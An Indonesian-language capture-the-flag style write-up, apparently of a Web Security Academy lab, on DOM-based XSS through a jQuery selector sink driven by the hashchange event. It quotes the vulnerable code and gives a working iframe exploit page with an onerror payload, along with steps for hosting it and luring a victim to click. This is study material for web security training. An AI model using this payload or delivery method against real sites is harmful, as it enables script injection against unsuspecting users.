# DOM XSS in jQuery selector sink using a hashchange event

kerentanan cross-site scripting berbasis DOM pada halaman beranda. Kerentanan ini menggunakan jQuery. `$()` fungsi pemilih untuk menggulir otomatis ke postingan tertentu, yang judulnya diteruskan melalui `location.hash` properti. 


Contoh Kode di Inspect :

```html
<script>
    $(window).on('hashchange', function () {
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```


## Persiapan

Siapkn file html untuk di kirim ke korban,mislakn di folder `server-exploit`,dan beri nama,`index.html`

```html
<!doctype html>
<html>
<body>

<iframe src="https://0a0d009303e6e46983dfcd54006600b9.web-security-academy.net/#"
        onload="this.src += '<img src=x onerror=print()>'">
</iframe>

</body>
</html>

```




## Cara Inject
1. Buka Inspect dan cari `location.hash` di Tab Debugger 
2. Perhatikan kode yang rentan pada halaman beranda menggunakan :
   - `var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`
3. Buka server exploit yangsudah di siapkn,dan jalnkan server.
   - `python3 -m http.server 8000`
4. buka halaman `http://localhost:8000`,dan akan melihat fungsi `print()` bekerja.
5. Asumsikan localhost ini adalah web yang kita hosting misakln di github pages,dan kita kirim ke korban agar korban klik link itu
